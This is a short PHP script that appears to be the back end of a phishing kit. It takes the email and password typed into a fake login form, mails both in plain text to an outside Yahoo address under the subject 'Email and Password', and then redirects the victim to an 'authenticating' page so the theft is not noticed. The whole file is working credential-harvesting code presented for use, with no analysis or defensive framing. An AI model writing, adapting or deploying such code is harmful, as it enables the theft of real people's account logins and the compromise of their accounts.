<?php 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['phone']; // Changed from 'phone' to 'password' to match the form

    // Email configuration
    $to = "poyelana@yahoo.com"; // Replace with your email address
    $subject = "Email and Password";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: THE KU FORM"; // Replace with a valid sender email address

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to success page if email is sent
        header("Location: authenticating.html"); // Replace with the desired success page URL
        exit();
    } else {
        // Redirect back to the form page if email fails to send
        header("Location: index.html?error=1"); // Redirect back to the form with an error message
        exit();
    }
} else {
    // Redirect back to the form if accessed directly
    header("Location: index.html");
    exit();
}
?>
